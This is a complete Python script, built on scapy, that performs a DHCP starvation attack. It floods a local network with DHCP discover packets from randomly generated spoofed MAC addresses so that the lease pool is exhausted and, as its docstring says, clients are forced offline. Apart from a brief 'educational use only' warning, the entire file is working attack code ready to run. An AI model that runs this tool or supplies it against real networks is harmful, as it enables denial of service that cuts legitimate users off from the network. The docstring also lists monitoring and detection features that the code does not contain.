#!/usr/bin/env python3
"""
N2 — DHCP Starvation
Exhaust DHCP lease pool to force clients offline

Features:
- Send massive DHCP discover requests
- Exhaust IP address pool
- Monitor DHCP server responses
- Detect DHCP exhaustion

Usage:
    sudo python3 dhcp_starve.py [--interface eth0] [--count 1000]

WARNING: Educational use only. Test on your own network.
"""

import argparse
import os
import random
import signal
import sys
import time
from scapy.all import *
import threading

class DHCPStarvation:
    def __init__(self, interface, count=1000):
        self.interface = interface
        self.count = count
        self.running = True
        self.sent = 0
        self.lock = threading.Lock()
        
        print(f"\n=== N2 — DHCP Starvation ===")
        print(f"Interface: {interface}")
        print(f"Target: {count} requests")
        print("=" * 30)
    
    def generate_mac(self):
        """Generate random MAC address"""
        return "02:%02x:%02x:%02x:%02x:%02x" % (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255)
        )
    
    def create_dhcp_discover(self, mac):
        """Create DHCP discover packet"""
        # Ethernet header
        eth = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff", type=0x0800)
        
        # IP header
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        
        # UDP header
        udp = UDP(sport=68, dport=67)
        
        # BOOTP header
        bootp = BOOTP(
            op=1,  # BOOTREQUEST
            htype=1,  # Ethernet
            hlen=6,
            hops=0,
            xid=random.randint(0, 0xFFFFFFFF),
            secs=0,
            flags=0x8000,  # Broadcast
            ciaddr="0.0.0.0",
            yiaddr="0.0.0.0",
            siaddr="0.0.0.0",
            giaddr="0.0.0.0",
            chaddr=bytes.fromhex(mac.replace(":", "")),
            sname="",
            file=""
        )
        
        # DHCP options
        dhcp_options = [
            ("message-type", "discover"),
            ("client_id", bytes.fromhex(mac.replace(":", ""))),
            ("requested_addr", "0.0.0.0"),
            ("hostname", f"starve-{random.randint(1000,9999)}"),
            ("param_req_list", [1, 3, 6, 15, 28, 51, 58, 59]),
            "end"
        ]
        
        dhcp = DHCP(options=dhcp_options)
        
        return eth / ip / udp / bootp / dhcp
    
    def send_discover(self, mac):
        """Send single DHCP discover"""
        try:
            pkt = self.create_dhcp_discover(mac)
            sendp(pkt, iface=self.interface, verbose=0)
            
            with self.lock:
                self.sent += 1
                if self.sent % 100 == 0:
                    print(f"  Sent {self.sent}/{self.count} DHCP discovers")
            
            return True
        except Exception as e:
            return False
    
    def start(self):
        """Start DHCP starvation"""
        print(f"\nStarting DHCP starvation...")
        print(f"Generating random MACs...\n")
        
        start_time = time.time()
        
        for i in range(self.count):
            if not self.running:
                break
            
            mac = self.generate_mac()
            self.send_discover(mac)
            
            # Small delay to avoid overwhelming
            time.sleep(0.01)
        
        elapsed = time.time() - start_time
        print(f"\n=== Starvation Complete ===")
        print(f"Sent: {self.sent} packets")
        print(f"Time: {elapsed:.2f} seconds")
        print(f"Rate: {self.sent/elapsed:.0f} packets/sec")
        print("=" * 30)
    
    def stop(self):
        """Stop starvation"""
        self.running = False
        print("\nStopping DHCP starvation...")

def signal_handler(sig, frame):
    """Handle Ctrl+C"""
    starver.stop()
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description='N2 — DHCP Starvation')
    parser.add_argument('--interface', '-i', default='eth0', help='Network interface')
    parser.add_argument('--count', '-c', type=int, default=1000, help='Number of requests')
    
    args = parser.parse_args()
    
    # Check root
    if os.geteuid() != 0:
        print("ERROR: DHCP Starvation requires root privileges")
        print("Run with: sudo python3 dhcp_starve.py")
        sys.exit(1)
    
    global starver
    starver = DHCPStarvation(args.interface, args.count)
    
    signal.signal(signal.SIGINT, signal_handler)
    starver.start()

if __name__ == '__main__':
    main()
